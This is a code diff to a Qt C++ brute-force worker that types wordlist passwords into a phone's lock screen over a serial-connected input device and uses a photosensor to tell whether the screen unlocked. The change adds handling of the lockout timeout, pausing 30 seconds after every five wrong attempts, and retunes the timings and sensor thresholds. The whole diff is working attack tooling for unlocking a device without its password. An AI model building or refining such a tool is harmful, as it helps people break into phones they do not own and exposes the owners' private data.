@@ -44,32 +44,43 @@ void BFWorker::run()
          emit updateConsole("connected  "+serialConn->portName().toUtf8()+".");
          int currentLine = startIndex;
          bool testPassword = true;
+         int countWrongPass = 0;
 
          while((testPassword) && (currentLine < wordlist->size()))
-         {
+         {           
             QString roundPassword = wordlist->at(currentLine);
 
             //1
             emit wakeUpPhone();
-            QThread::currentThread()->msleep(1150); //awaits a bit for login screen animation
+            QThread::currentThread()->msleep(1200); //awaits a bit for login screen animation
 
             //2
             emit updateConsole("sending password >>"+roundPassword.toUtf8()+"<<");
             emit sendString(roundPassword.toUtf8()+"\n");  //tries password
-            emit updateConsole("round "+QString::number(currentLine).toUtf8()+" of "+QString::number(wordlist->size()).toUtf8()+".");
+            emit updateConsole("round "+QString::number(currentLine).toUtf8()+" of "+QString::number(wordlist->size()).toUtf8()+".");            
+            countWrongPass++;
 
             //3
-            QThread::currentThread()->msleep(12150); //awaits 12 seconds for screen to turn off if pwd was wrong
+            QThread::currentThread()->msleep(11250); //awaits 12 seconds for screen to turn off if pwd was wrong
 
             emit readPhotosensorValue();
-            if ((currentScreen > (screenOff*1.2)) || (currentScreen < (screenOff*0.8)))
+            if ((currentScreen > (screenOff*1.25)) || (currentScreen < (screenOff*0.75)))
             {
                 emit updateConsole("!!! PHOTOSENSOR out of threshold. STOPPING SEARCH !!!");
                 testPassword = false;
             }
 
             //4
-            QThread::currentThread()->msleep(19150); //timeout before next attempt
+            QThread::currentThread()->msleep(2100); //timeout before next attempt
+
+            if (countWrongPass >= 5)    //if wrong pass 5 times, awaits 30s
+            {
+                emit wakeUpPhone();
+                emit sendString("U");  //tries password
+                QThread::currentThread()->msleep(30100); //timeout before next attempt
+                countWrongPass = 0;
+
+            }
 
             currentLine++;
          }
